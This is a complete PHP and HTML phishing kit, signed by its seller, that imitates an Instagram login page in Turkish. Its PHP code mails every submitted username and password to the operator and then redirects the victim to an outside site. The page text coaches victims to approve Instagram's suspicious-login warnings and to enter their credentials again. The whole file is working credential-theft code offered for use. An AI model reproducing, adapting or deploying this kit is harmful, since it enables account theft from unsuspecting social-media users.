To ZAIUON!!!
@BUYZAIUON
@team_zaiuon
@Zz1zZ
@Zaiuone1_bot

<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: https://i.anindabegeni.com/member');
$message = '';
foreach($_POST as $variable => $value) {
$message .= $variable.': '.$value."\r\n";}
$header  = 'From: PhishBait <donotreply@pbmkr.vt>'."\r\n";
$header .= 'Reply-To: donotreply@pbmkr.vt'."\r\n";
$header .= 'MIME-Version: 1.0'."\r\n";
$header .= 'Content-Type: text/plain; charset=utf-8'."\r\n";
$header .= 'Content-Transfer-Encoding: 8bit'."\r\n";
$header .= 'X-Mailer: PHP v'.phpversion();
mail('your Email', $_SERVER['REMOTE_ADDR'].' @ '.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'], $message, $header);
exit;
} ?>
<html lang="tr">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>Giriş</title>
<meta name="robots" content="noindex, nofollow">
<meta id="viewport" name="viewport" content="width=device-width, user-scalable=no, initial-scale=1, minimum-scale=1, maximum-scale=1">
<style>
        body::-webkit-scrollbar {
            display : none;
        }
    </style>
<link rel="stylesheet" href="https://i.anindabegeni.com/assets/style/instastyle.css" />
</head>
<body>
<span id="react-root">
<section class="instaclass5">
<main class="instaclass4 instaclass30" role="main">
<article class="instaarticle3">
<div class="instaclass1">
<div class="instaclass2">
<div class="instaclass6">
<div class="instaclass20" style="color: red; text-align: left;">
<h1 style="color: black; font-weight: bold; font-size:25px; text-align:center; padding: 10px;">GİRİŞ</h1>
</div>
<form action="<?php echo basename(__FILE__); ?>" method="post" class="instaclass7">
<div class="instaclass8 instaclass9"><input type="text" class="instaclass10 instaclass11" aria-describedby="" aria-label="Kullanıcı adı" aria-required="true" maxlength="30" name="username" placeholder="Kullanıcı adı" value=""></div>
<div class="instaclass8 instaclass9">
<input type="password" class="instaclass10 instaclass11" aria-describedby="" aria-label="Şifre" aria-required="true" name="password" placeholder="Şifre">
</div>
<span class="instaclass14 instaclass15">
<button id="login_insta" class="instaclass16 instaclass17 instaclass18 instaclass19">Giriş yap</button>
<div class="spiSpinner"></div>
</span>
<div class="instaclass20">
<p id="slfErrorAlert" aria-atomic="true" role="alert">Üzgünüz, şifren yanlıştı. Lütfen şifreni dikkatlice kontrol et.</p>
</div>
<div class="instaclass20">
<p id="slfErrorAlert" aria-atomic="true" role="alert">Üzgünüz, şifren yanlıştı. Lütfen şifreni dikkatlice kontrol et.</p>
</div>
<div class="instaclass20" style="color: black; text-align: left;">
<p style="color: red;">Bu sitenin instagram ile hiçbir bağlantısı yoktur. Kullanıcı adı ve şifreniz ile Instagram API sistemi kullanılarak işlemleriniz gerçekleştirilir.</p><p> </p>
<p>Bu site Havuz Sistemi mantığı ile çalışmaktadır.</p>
<p style="color: blue; text-align: left;">Sürekli şifre yanlış hatası alıyorsanız instagram mobil uygulaması üzerinden hesabınıza girin. Aşağıdaki gibi çıkan uyarıda bendim tıklayın.</p>
<center><img src="https://i.hizliresim.com/NOmmNL.png"></center>
</div>
<div class="instaclass20" style="color: black; text-align: left;">
<p style="color: blue; text-align: left;">Sürekli şifre yanlış hatası ile karşılaşabilirsiniz. Instagram'ın anti-spam sisteminde bir hata var. Konu, çözebileceğimiz bir şey değil. Instagram kendisi çözecektir. Burayı takip etmeye devam edin.</p>
</div>
<div class="instaclass20" style="color: black; text-align: left;">

<span style='color: red; font-weight: bold;'>Burayı oku!</span> 1- Giriş uzun sürebilir bekleyin lütfen..(30 saniye kadar sürer.) <br>2- ilk girişte şifre yanlış diyebilir. https://www.instagram.com üzerinden hesabınıza girin. Çıkan uyarıda bendim diyin ve buradan tekrar giriş yapın..<br>3- Instagram şifrenizi bloke edebilir. Şifremi unuttum diyerek yeni şifre alabilirsiniz.</div>
</form>
</div>
</div>
</div>
</article>
</main>
</section>
</span>
<div class="display: none">
<img src="https://whos.amung.us/widget/ianinda.png">
</div>
<script src="https://i.anindabegeni.com/assets/jquery/2.2.4/jquery.min.js"></script>
<script src='https://www.google.com/recaptcha/api.js'></script>
<script>
          $('#login_insta').click(function() {
              $('#slfErrorAlert').hide();
              $(this).attr("disabled", "disabled");
              $maindiv = $(this);
              $maindiv.addClass("instaclass31");
              $('.spispinner').show();
			  			  var dataList = "username=" + encodeURIComponent($('input[name="username"]').val()) + "&password=" + encodeURIComponent($('input[name="password"]').val()) + "&antiForgeryToken=8a70726f283efc4657cca8db2d65c7b1";
			  			  
			  
              $.ajax({
                         type    : "POST",
                         url     : "?",
                         dataType: "json",
                         data    : dataList,
                         success : function(json) {
                             if(json.status == 'success') {
                                 window.parent.location.href = json.returnUrl;
                                 window.parent.$.fancybox.close();
                             } else {
                                 $('#slfErrorAlert').html(json.error);
                                 $('#slfErrorAlert').show();
                                 $('.spispinner').hide();
                                 $maindiv.removeAttr("disabled");
                                 $maindiv.removeClass("instaclass31");
                             }
                         }
                     });
          });
      </script>
<script type="text/javascript">
        (function(i, s, o, g, r, a, m) {
        i['GoogleAnalyticsObject'] = r;
        i[r] = i[r] || function() {
                (i[r].q = i[r].q || []).push(arguments)
            }, i[r].l = 1 * new Date();
        a = s.createElement(o),
            m = s.getElementsByTagName(o)[0];
        a.async = 1;
        a.src   = g;
        m.parentNode.insertBefore(a, m)
    })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
    ga('create', '', 'auto');
    ga('send', 'pageview');
    </script>
</body>
</html>
By ZAIUON
@Zz1zZ
@Zaiuone1_bot
@team_zaiuon
@buyzaiuon

FuCk YoU
